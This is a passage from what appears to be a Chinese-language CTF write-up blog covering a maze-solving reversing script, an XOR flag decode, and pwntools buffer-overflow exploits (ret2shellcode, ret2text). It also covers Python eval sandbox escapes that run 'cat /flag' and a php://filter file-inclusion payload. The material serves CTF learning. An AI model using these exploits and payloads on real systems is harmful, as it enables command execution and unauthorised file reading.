punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">]</span>directions <span class="token operator">=</span> <span class="token punctuation">[</span>                              <span class="token comment"># 使用列表设计走迷宫方向</span>    <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token punctuation">(</span>x<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> y<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token comment"># 1</span>    <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token punctuation">(</span>x<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> y<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token comment"># 2</span>    <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token punctuation">(</span>x<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> y<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token comment"># 3</span>    <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token punctuation">(</span>x<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> y<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token comment"># 4</span>    <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token punctuation">(</span>x<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> y<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token comment"># 5</span>    <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token punctuation">(</span>x<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span> y<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token comment"># 6</span>    <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token punctuation">(</span>x<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span> y<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token comment"># 7</span>    <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token punctuation">(</span>x<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> y<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token comment"># 8</span><span class="token punctuation">]</span>true_flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">maze_solve</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> goal_x<span class="token punctuation">,</span> goal_y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">''' 解迷宫程序 x, y是迷宫入口, goal_x, goal_y是迷宫出口'''</span>    maze<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span>    stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                              <span class="token comment"># 建立路径栈</span>    stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token comment"># 将路径push入栈</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'迷宫开始'</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        cur <span class="token operator">=</span> stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                     <span class="token comment"># 目前位置</span>        <span class="token keyword">if</span> cur<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> goal_x <span class="token keyword">and</span> cur<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> goal_y<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'抵达出口'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>                     <span class="token comment"># 抵达出口返回True</span>        <span class="token keyword">for</span> kind<span class="token punctuation">,</span><span class="token builtin">dir</span> <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>directions<span class="token punctuation">)</span> <span class="token punctuation">:</span>              <span class="token comment"># 依上, 下, 左, 右优先次序走此迷宫</span>            <span class="token builtin">next</span> <span class="token operator">=</span> <span class="token builtin">dir</span><span class="token punctuation">(</span>cur<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> cur<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token builtin">next</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">29</span> <span class="token keyword">and</span> <span class="token builtin">next</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">29</span> <span class="token keyword">and</span> <span class="token builtin">next</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>=</span><span class="token number">0</span> <span class="token keyword">and</span> <span class="token builtin">next</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> maze<span class="token punctuation">[</span><span class="token builtin">next</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token builtin">next</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 如果是通道可以走</span>                    stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">)</span>                    true_flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>kind<span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">)</span>                    maze<span class="token punctuation">[</span><span class="token builtin">next</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token builtin">next</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span>  <span class="token comment"># 用2标记走过的路</span>                    <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>                               <span class="token comment"># 如果进入死路, 则回溯</span>            maze<span class="token punctuation">[</span>cur<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span>        <span class="token comment"># 标记死路</span>            stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>                     <span class="token comment"># 回溯</span>            true_flag<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"没有路径"</span><span class="token punctuation">)</span>maze_solve<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">)</span>pprint<span class="token punctuation">(</span>maze<span class="token punctuation">)</span>                                <span class="token comment"># 跳行显示元素</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>true_flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># flag = []</span><span class="token comment"># for x,item in enumerate(maze):</span><span class="token comment">#     for y,item2 in enumerate(item):</span><span class="token comment">#         if item2 == 2:</span><span class="token comment">#             flag.append(str(x))</span><span class="token comment">#             flag.append(str(y))</span><span class="token comment"># print("".join(flag))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="10-ez-flower"><a href="#10-ez-flower" class="headerlink" title="10. ez_flower"></a>10. ez_flower</h2><p>此题是跟异常处理机制相关的逆向问题。</p><p>ida反汇编之后，会找到一个函数，但是这个函数会触发 <code>除数为零</code>  的异常</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221116215433.png" alt="异常触发函数"></p><p>触发异常之后，要把信号传递给进程。然后就是跟着ida一步一步的调试啦。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221116215636.png" alt="触发异常"></p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221116215704.png" alt="传递给进程"></p><p>这里要注意，第二个异常处理函数才是我们要找的函数。找到之后，它利用了一些栈结构去调用真正可以计算flag的函数。</p><p>这个函数并不复杂，就是简单的异或运算。但是由于反汇编出来的东西不是很友好，所以要一句句的看汇编代码并结合动态调试，有不懂的可以根据实际情况猜一下。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token string">'s'</span><span class="token punctuation">,</span>  <span class="token string">'b'</span><span class="token punctuation">,</span>  <span class="token string">'w'</span><span class="token punctuation">,</span>  <span class="token string">'`'</span><span class="token punctuation">,</span>  <span class="token string">'p'</span><span class="token punctuation">,</span>  <span class="token string">'c'</span><span class="token punctuation">,</span>  <span class="token string">'&#125;'</span><span class="token punctuation">,</span>  <span class="token string">'O'</span><span class="token punctuation">,</span>  <span class="token string">'t'</span><span class="token punctuation">,</span>  <span class="token string">'p'</span><span class="token punctuation">,</span>  <span class="token string">'\\'</span><span class="token punctuation">,</span>  <span class="token string">'p'</span><span class="token punctuation">,</span>  <span class="token string">'`'</span><span class="token punctuation">,</span>  <span class="token string">'g'</span><span class="token punctuation">,</span>  <span class="token string">'m'</span><span class="token punctuation">,</span>  <span class="token string">'^'</span><span class="token punctuation">,</span>  <span class="token string">'k'</span><span class="token punctuation">,</span>  <span class="token string">'p'</span><span class="token punctuation">,</span>  <span class="token string">'['</span><span class="token punctuation">,</span>  <span class="token string">'l'</span><span class="token punctuation">,</span>  <span class="token string">'h'</span><span class="token punctuation">,</span>  <span class="token string">'_'</span><span class="token punctuation">,</span>  <span class="token string">'t'</span><span class="token punctuation">,</span>  <span class="token string">'p'</span><span class="token punctuation">,</span>  <span class="token string">'d'</span><span class="token punctuation">,</span>  <span class="token string">'a'</span><span class="token punctuation">,</span>  <span class="token string">'k'</span><span class="token punctuation">,</span>  <span class="token string">'r'</span><span class="token punctuation">,</span>  <span class="token string">'_'</span><span class="token punctuation">,</span>  <span class="token string">'o'</span><span class="token punctuation">,</span>  <span class="token string">'g'</span><span class="token punctuation">,</span>  <span class="token string">'f'</span><span class="token punctuation">,</span>  <span class="token string">'`'</span><span class="token punctuation">,</span>  <span class="token string">'Z'</span><span class="token punctuation">,</span>  <span class="token string">'i'</span><span class="token punctuation">,</span>  <span class="token string">'f'</span><span class="token punctuation">,</span>  <span class="token string">'^'</span><span class="token punctuation">,</span>  <span class="token string">'p'</span><span class="token punctuation">,</span>  <span class="token string">'f'</span><span class="token punctuation">,</span>  <span class="token string">'r'</span><span class="token punctuation">,</span>  <span class="token string">'`'</span><span class="token punctuation">,</span>  <span class="token string">'t'</span><span class="token punctuation">,</span>  <span class="token string">'s'</span><span class="token punctuation">,</span>  <span class="token string">'d'</span><span class="token punctuation">,</span>  <span class="token string">']'</span><span class="token punctuation">,</span>  <span class="token string">'s'</span><span class="token punctuation">,</span>  <span class="token string">'h'</span><span class="token punctuation">,</span>  <span class="token string">'d'</span><span class="token punctuation">,</span>  <span class="token number">127</span><span class="token punctuation">,</span> <span class="token comment"># delelte</span>  <span class="token string">'e'</span><span class="token punctuation">,</span>  <span class="token string">'s'</span><span class="token punctuation">,</span>  <span class="token string">'q'</span><span class="token punctuation">,</span>  <span class="token string">'~'</span><span class="token punctuation">,</span><span class="token punctuation">]</span>k <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>           flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span> <span class="token builtin">chr</span><span class="token punctuation">(</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">^</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>        k <span class="token operator">=</span> k<span class="token operator">+</span><span class="token number">1</span>flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span> <span class="token builtin">chr</span><span class="token punctuation">(</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>k <span class="token operator">=</span> k<span class="token operator">+</span><span class="token number">1</span>flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span> <span class="token builtin">chr</span><span class="token punctuation">(</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>k <span class="token operator">=</span> k<span class="token operator">+</span><span class="token number">1</span>flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span> <span class="token builtin">chr</span><span class="token punctuation">(</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>k <span class="token operator">=</span> k<span class="token operator">+</span><span class="token number">1</span>flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span> <span class="token builtin">chr</span><span class="token punctuation">(</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>k <span class="token operator">=</span> k<span class="token operator">+</span><span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="windows异常处理函数的机制—需要总结哦"><a href="#windows异常处理函数的机制—需要总结哦" class="headerlink" title="windows异常处理函数的机制—需要总结哦"></a>windows异常处理函数的机制—需要总结哦</h3><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h3 id="1-2048-game"><a href="#1-2048-game" class="headerlink" title="1. 2048_game"></a>1. 2048_game</h3><p>上下左右随机按的，直接按到对应的分数，然后就会给相应的flag</p><h3 id="2-ret2shellcode"><a href="#2-ret2shellcode" class="headerlink" title="2. ret2shellcode"></a>2. ret2shellcode</h3><p>什么保护也没有！</p><p>这个就是把shellcode写入到段里面。然后再利用栈溢出跳过去。</p><p>但是我不明白的一点是，为什么在本地显示这个段实际上是没有执行权限的。本地调试也打不通。</p><p>可是拿服务器一试就行，真的很奇怪哎！</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2shellcode'</span><span class="token punctuation">)</span><span class="token comment">#gdb.attach(sh, 'b* main')</span><span class="token comment">#sh = remote("114.117.187.56",10003)</span>target <span class="token operator">=</span> <span class="token number">0x00000000004040A0</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#print(len(shellcode))</span><span class="token comment">#shellcode.ljust(112,b'A')</span>nop <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token string">'nop'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 接收一行输出</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 接收一行输出</span>crash <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>crash<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>crash<span class="token punctuation">)</span><span class="token comment"># sh.recv()</span><span class="token comment"># payload = shellcode.ljust(196,b'A') + p64(target)</span><span class="token comment"># print(payload)</span><span class="token comment">#payload = shellcode + ("A"*(196-44)).encode() + p64(target)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-ret2text"><a href="#3-ret2text" class="headerlink" title="3. ret2text"></a>3. ret2text</h3><p>什么保护也没有！</p><p>这个就是直接跳到system的地址就行</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>c <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"114.117.187.56"</span><span class="token punctuation">,</span> <span class="token number">10002</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"AAAA"</span> <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x08049256</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'unicode_escape'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-test-your-nc"><a href="#4-test-your-nc" class="headerlink" title="4. test_your_nc"></a>4. test_your_nc</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> xxx<span class="token function">ls</span><span class="token function">cat</span> flagflag<span class="token punctuation">&#123;</span>Nc_1s-Tn3_F1r5t_sT3p_0f_pvvn<span class="token operator">!</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-easy-learning-python"><a href="#5-easy-learning-python" class="headerlink" title="5. [easy]learning_python"></a>5. [easy]learning_python</h3><p>eval执行<br>print(eval(“<strong>import</strong>(‘os’).listdir(r’/‘)”))<br>发现flag目录<br>查看flag<br>print(eval(“<strong>import</strong>(‘os’).system(‘cat /flag’)”))。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123105847.png" alt="1"></p><h3 id="6-learning-python2"><a href="#6-learning-python2" class="headerlink" title="6. learning_python2"></a>6. learning_python2</h3><p>发现对import关键字进行了过滤。<br>print(eval(“<strong>im”+”port</strong>(‘os’).listdir(r’/‘)”))<br>print(eval(“<strong>im”+”port</strong>(‘os’).system(‘cat /flag’)”))</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123105919.png" alt="1"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1.</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"__im"</span><span class="token operator">+</span><span class="token string">"port__('os').listdir(r'/')"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token number">2.</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"__im"</span><span class="token operator">+</span><span class="token string">"port__('os').system('cat /flag')"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="7-learning-python3"><a href="#7-learning-python3" class="headerlink" title="7. learning_python3"></a>7. learning_python3</h3><p>print(eval(“().<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()[99].get_data(0,’/flag’)”))  测试找到frozen_importlib_external.FileLoader为列表中第99个 编码绕过。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123110006.png" alt="2"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h3 id="小宇的通勤"><a href="#小宇的通勤" class="headerlink" title="小宇的通勤"></a>小宇的通勤</h3><p>2号线 和 8 号线是重叠的，只有深圳的</p><p>然后2号线、8号线是重叠的，一个一个试就行。最后是岗厦北</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221121232033.png" alt="地铁图片"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="1-Web-Include"><a href="#1-Web-Include" class="headerlink" title="1. Web_Include"></a>1. Web_Include</h3><p>要用到php的封装协议，在文件后缀添加  <code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code>。首先这是一个file关键字的get参数传递，php://是一种协议名称，php://filter/是一种访问本地文件的协议，<code>/read=convert.base64-encode/</code>表示读取的方式是base64编码后，<code>resource=flag.php</code>表示目标文件为flag.php。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123095422.png" alt="1"></p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123095440.png" alt="2"></p><h3 